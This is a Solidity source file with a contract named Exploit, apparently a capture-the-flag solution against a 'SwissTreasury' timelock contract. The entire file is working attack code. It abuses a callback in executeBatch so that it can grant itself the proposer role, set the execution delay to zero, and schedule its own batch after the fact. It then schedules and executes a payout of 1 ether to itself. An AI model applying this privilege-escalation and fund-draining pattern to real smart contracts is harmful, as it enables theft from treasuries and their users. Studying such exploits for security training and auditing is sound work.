// SPDX-License-Identifier: MIT
pragma solidity 0.8.4;

import './SwissTreasury.sol';

contract Exploit {
  SwissTreasury private instance;

  constructor(SwissTreasury _instance) {
    instance = _instance;
  }

  receive() external payable {}

  function finalize() external {
    if (msg.sender != address(instance)) {
      /* step 1 - privilege escalatation
      from EXECUTOR_ROLE to PROPOSER_ROLE */
      // instance.grantRole(TimelockControl.PROPOSER_ROLE, address(this));
      
      /* step 2 - remove delay
      so new proposal can be executed immediately */
      // instance.updateDelay(0);
      
      /* step 3 - schedule proposal through callback
      so isOperationReady(id) passes in _afterCall in executeBatch */
      // target.finalize()

      // core
      address[] memory targets = new address[](3);
      targets[0] = address(instance);
      targets[1] = address(instance);
      targets[2] = address(this);

      uint256[] memory values = new uint256[](3);

      bytes[] memory datas = new bytes[](3);

      datas[0] = abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("PROPOSER_ROLE"), address(this));
      datas[1] = abi.encodeWithSignature("updateDelay(uint256)", 0);
      datas[2] = abi.encodeWithSignature("finalize()");

      instance.executeBatch(targets, values, datas, 0, 0);

      /* step 4 and 5 - with PROPOSER role and no delay in execution
      schedule new command for execution and execute immediately */    
      instance.schedule(address(instance), 0, abi.encodeWithSignature("distributeFunds(address,uint256)", address(this), 1 ether), 0, 0, 0);
      instance.execute(address(instance), 0, abi.encodeWithSignature("distributeFunds(address,uint256)", address(this), 1 ether), 0, 0);
    } else {
      address[] memory targets = new address[](3);
      targets[0] = address(instance);
      targets[1] = address(instance);
      targets[2] = address(this);

      uint256[] memory values = new uint256[](3);

      bytes[] memory datas = new bytes[](3);

      datas[0] = abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("PROPOSER_ROLE"), address(this));
      datas[1] = abi.encodeWithSignature("updateDelay(uint256)", 0);
      datas[2] = abi.encodeWithSignature("finalize()");

      instance.scheduleBatch(targets, values, datas, 0, 0, 0);
    }
  }
}